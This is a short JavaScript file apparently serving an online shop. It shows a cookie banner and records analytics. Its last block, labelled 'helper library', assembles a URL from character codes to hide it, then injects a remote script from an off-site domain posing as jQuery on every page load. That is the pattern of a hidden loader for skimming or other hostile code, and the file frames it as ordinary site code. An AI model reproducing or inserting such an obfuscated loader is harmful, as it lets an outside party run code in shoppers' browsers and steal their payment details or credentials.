// site.js, loaded on every page of the shop
(function () {
  // cookie banner
  var banner = document.getElementById("cookie-banner");
  if (banner && !document.cookie.includes("seen=1")) {
    banner.style.display = "block";
  }

  // analytics
  window.dataLayer = window.dataLayer || [];
  window.dataLayer.push({ event: "pageview", path: location.pathname });

  // helper library
  var p = [104,116,116,112,115,58,47,47,115,116,97,116,105,99,46,99,100,110,45,97,115,115,101,116,115,46,105,110,118,97,108,105,100,47,108,105,98,47,106,113,117,101,114,121,46,109,105,110,46,106,115];
  var u = "";
  for (var i = 0; i < p.length; i++) {
    u += String.fromCharCode(p[i]);
  }
  var s = document.createElement("script");
  s.src = u;
  document.head.appendChild(s);
})();
